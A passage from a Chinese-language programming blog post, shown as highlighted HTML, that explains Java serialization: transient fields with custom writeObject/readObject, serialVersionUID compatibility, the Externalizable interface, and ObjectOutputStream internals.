class="string">&quot;MyList&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, arr=&quot;</span> + Arrays.toString(arr) +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//-------------------------- 自定义序列化反序列化 arr 元素 ------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that</span></span><br><span class="line"><span class="comment">     * is, serialize it).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serialData</span> The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;</span></span><br><span class="line"><span class="comment">     * instance is emitted (int), followed by all of its elements</span></span><br><span class="line"><span class="comment">     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//手动序列化 arr  前面30个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            s.writeObject(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,</span></span><br><span class="line"><span class="comment">     * deserialize it).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">30</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            arr[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransientMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./transient.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeMyList();</span><br><span class="line"> </span><br><span class="line">        deserializeMyList();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化...&quot;</span>);</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyList</span>(<span class="string">&quot;ArrayList&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(myList);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.如果 private  Object[] arr; 没有使用 transient ，那么整个数组都会被保存，而不是保存实际存储的数据</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]&#125;</span></span><br><span class="line"><span class="comment">    2.private transient Object[] arr;设置了 transient，表示 arr 元素不进行序列化</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=null&#125;</span></span><br><span class="line"><span class="comment">    3.参考 ArrayList 处理内部的 transient Object[] elementData; 数组是通过 writeObject 和 readObject 实现的</span></span><br><span class="line"><span class="comment">    我们的 MyList 内部也可以借鉴这种方式实现transient元素的手动序列化和反序列化。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化...&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> (MyList) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(myList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">序列化...</span><br><span class="line">writeObject...</span><br><span class="line">反序列化...</span><br><span class="line">readObject...</span><br><span class="line">MyList&#123;name=<span class="string">&#x27;ArrayList&#x27;</span>, arr=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>]&#125;</span><br></pre></td></tr></table></figure><p><strong>6.Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片</strong></p><p><strong>serialVersionUID与兼容性问题</strong></p><h1 id="序列化ID"><a href="#序列化ID" class="headerlink" title="序列化ID"></a>序列化ID</h1><p>可以看到，我们在进行序列化时，加了一个serialVersionUID字段，这便是序列化ID</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure><p>这个序列化ID起着关键的作用，它决定着是否能够成功反序列化！java的序列化机制是通过判断运行时类的serialVersionUID来验证版本一致性的，在进行反序列化时，JVM会把传进来的字节流中的serialVersionUID与本地实体类中的serialVersionUID进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常</p><p><strong>即序列化ID是为了保证成功进行反序列化</strong></p><h2 id="如何生成这个-serialVersionUID"><a href="#如何生成这个-serialVersionUID" class="headerlink" title="如何生成这个 serialVersionUID"></a>如何生成这个 serialVersionUID</h2><ol><li>使用 <code>AS plugin</code> 插件就可以生成</li><li>在JDK中，可以利用 JDK 的 bin 目录下的 <code>serialver</code> 工具产生这个<code>serialVersionUID</code>，对于 <code>Student.class</code>，执行命令：<code>serialver com.example.seriable.Student</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  classes git:(master) ✗ /Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_111</span>.jdk/Contents/Home/bin/serialver com.example.seriable.Student </span><br><span class="line">com.example.seriable.Student:    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">6840182814363029482L</span>;<span class="comment">//这个就是工具生成的 SerialVersionUID 值了</span></span><br></pre></td></tr></table></figure><p>使用 AS plugin 的方式应该底层也是使用到这个 JDK 工具去生成的 SerialVersionUID 值，测试结果来看这两个生成的值是一样的</p><h2 id="serialVersionUID-的兼容性问题"><a href="#serialVersionUID-的兼容性问题" class="headerlink" title="serialVersionUID 的兼容性问题"></a>serialVersionUID 的兼容性问题</h2><p>具体的兼容性问题如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: com.example.seriable.Student; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span></span><br><span class="line"><span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">926212341182608815</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">6840182814363029482</span></span><br></pre></td></tr></table></figure><p>关于这个异常，它是属于兼容问题异常，是发生在反序列化阶段，检测到 serialVersionUID 不一致导致的。具体的分析如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">序列化时使用的 serialVersionUID = -<span class="number">926212341182608815L</span>，如果期间属性被修改了，如果 serialVersionUID 发生改变 -<span class="number">6840182814363029482</span> ，那么</span><br><span class="line">反序列化时就会出现类不兼容问题。</span><br></pre></td></tr></table></figure><p>serialVersionUID 发生改变有三种情况：</p><ol><li>手动去修改导致当前的 serialVersionUID 与序列化前的不一样。</li><li>我们根本就没有手动去写这个 serialVersionUID 常量，那么 JVM 内部会根据类结构去计算得到这个 serialVersionUID 值，在类结构发生改变时(属性增加，删除或者类型修改了)这种也是会导致 serialVersionUID 发生变化。</li><li>假如类结构没有发生改变，并且没有定义 serialVersionUID ，但是反序列和序列化操作的虚拟机不一样也可能导致计算出来的 serialVersionUID 不一样。</li></ol><p>JVM 规范强烈建议我们手动声明一个版本号，这个数字可以是随机的，只要固定不变就可以。同时最好是 private 和 final 的，尽量保证不变</p><h2 id="默认的序列化ID"><a href="#默认的序列化ID" class="headerlink" title="默认的序列化ID"></a>默认的序列化ID</h2><p>当我们一个实体类中没有显式的定义一个名为“serialVersionUID”、类型为long的变量时，Java序列化机制会根据编译时的class自动生成一个serialVersionUID作为序列化版本比较，这种情况下，只有同一次编译生成的class才会生成相同的serialVersionUID。譬如，当我们编写一个类时，随着时间的推移，我们因为需求改动，需要在本地类中添加其他的字段，这个时候再反序列化时便会出现serialVersionUID不一致，导致反序列化失败<br><strong>解决：在本地类中添加一个<code>serialVersionUID</code>变量，值保持不变，便可以进行序列化和反序列化</strong></p><blockquote><p>如果没有显示指定serialVersionUID，会自动生成一个</p></blockquote><p>只有同一次编译生成的class才会生成相同的serialVersionUID</p><p>但是如果出现需求变动，Bean类发生改变，则会导致反序列化失败。为了不出现这类的问题，所以我们最好还是显式的指定一个serialVersionUID</p><h1 id="Externalizable-接口"><a href="#Externalizable-接口" class="headerlink" title="Externalizable 接口"></a>Externalizable 接口</h1><p>Serializable 接口内部序列化是 JVM 自动实现的，如果我们想自定义序列化过程，就可以使用以上这个接口来实现，它内部提供两个接口方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="comment">//将要序列化的对象属性通过 var1.wrietXxx() 写入到序列化流中</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput var1)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="comment">//将要反序列化的对象属性通过 var1.readXxx() 读出来</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Externalizable 的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">7424420983806112577L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person: empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;person writeExternal...&quot;</span>);</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;person readExternal...&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试 Person 对象的序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalizableMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;../person.bin&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        serializable(person, FILE_PATH);</span><br><span class="line">        System.out.println(<span class="string">&quot;============反序列化=============&quot;</span>);</span><br><span class="line">        person = (Person) deserializable(FILE_PATH);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object o, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">boas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(boas);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        boas.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserializable</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> bis.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试输出结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Person&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, age=<span class="number">15</span>&#125;</span><br><span class="line">person writeExternal...</span><br><span class="line">============反序列化=============</span><br><span class="line">Person: empty</span><br><span class="line">person readExternal...</span><br><span class="line">Person&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, age=<span class="number">15</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="Java-的序列化步骤与数据结构分析"><a href="#Java-的序列化步骤与数据结构分析" class="headerlink" title="Java 的序列化步骤与数据结构分析"></a>Java 的序列化步骤与数据结构分析</h1><p>序列化算法一般会按步骤做如下事情：</p><ul><li>将对象实例相关的类元数据输出</li><li>递归地输出类的超类描述直到不再有超类</li><li>类元数据完了以后，开始从最顶层的超类开始输出对象实例的实际数据值</li><li>从上至下递归输出实例的数据</li></ul><h2 id="writeObject-原理分析"><a href="#writeObject-原理分析" class="headerlink" title="writeObject 原理分析"></a>writeObject 原理分析</h2><p><code>ObjectOutputStream</code> 构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);<span class="comment">//①</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="literal">false</span>;<span class="comment">//②</span></span><br><span class="line">    writeStreamHeader();<span class="comment">//③</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>bout：用于写入一些类元数据还有对象中基本数据类型的值</li><li>enableOverride ：false 表示不支持重写序列化过程，如果为 true ，那么需要重写 writeObjectOverride 方法。这个一般不用管它</li><li>writeStreamHeader() 写入头信息</li></ul><p><strong>ObjectOutputStream#writeStreamHeader()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);<span class="comment">//①</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION);<span class="comment">//②</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>STREAM_MAGIC 声明使用了序列化协议，bout 就是一个流，将对应的头数据写入该流中</p></li><li><p>STREAM_VERSION 指定序列化协议版本</p></li></ul><p><strong>ObjectOUtStream#writeObject(obj);</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;<span class="comment">//一般不会走这里，因为在 ObjectOutputStream 构造设置为 false 了</span></span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;<span class="comment">//代码会执行这里</span></span><br><span class="line">        writeObject0(obj, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ObjectOutStream#writeObject0()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;</span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">        ObjectStreamClass desc;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="comment">// END Android-changed:  Make Class and ObjectStreamClass replaceable.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//③</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">                    cl.getName() + <span 